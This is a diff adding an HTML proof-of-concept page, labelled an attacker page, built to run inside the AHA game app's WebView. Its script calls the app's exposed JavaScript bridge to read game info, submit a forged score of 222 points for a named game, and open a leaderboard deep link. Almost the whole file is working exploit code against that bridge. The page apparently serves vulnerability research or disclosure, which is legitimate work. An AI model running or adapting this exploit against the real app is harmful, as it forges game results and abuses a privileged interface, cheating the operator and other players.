@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>stage</title>
+</head>
+<body style="background:#fff;font-family:monospace">
+  <h3>attacker page inside AHA game WebView</h3>
+  <pre id="o" style="white-space:pre-wrap;word-break:break-all"></pre>
+  <script>
+    var GAME = 94192, POINTS = 222;
+    function out(k, v) {
+      document.getElementById('o').textContent += k + ': ' + v + '\n';
+    }
+    window.bridgeCore = {
+      receiver: function (id, keep, data) { out('callback#' + id, data); }
+    };
+    function call(m, p, id) {
+      try {
+        return a_bridge.call(JSON.stringify({ method: m, uniqueId: id, params: p || {} }));
+      } catch (e) {
+        return 'EXC ' + e;
+      }
+    }
+
+    out('origin', location.origin);
+    out('typeof a_bridge', typeof window.a_bridge);
+    out('gameInfo', call('/gameInfo/info', {}, 1));
+
+    setTimeout(function () {
+      var r = call('/gameAbility/reportGamePointsOrGameResult', { resultType: 0, points: POINTS }, 2);
+      out('report points=' + POINTS, r);
+    }, 8000);
+
+    setTimeout(function () {
+      var u = 'aha://h5gamerank?gameId=' + GAME
+        + '&gameName=' + encodeURIComponent('Crush Block Pro')
+        + '&gameIcon=' + encodeURIComponent('https://static.ahagamecenter.com/resources/default_avatar/default_avatar_4.jpg')
+        + '&competitionId=0&timestamp=' + Date.now();
+      var r = call('/router/page', { url: u }, 3);
+      out('open leaderboard', r);
+    }, 14000);
+  </script>
+</body>
+</html>
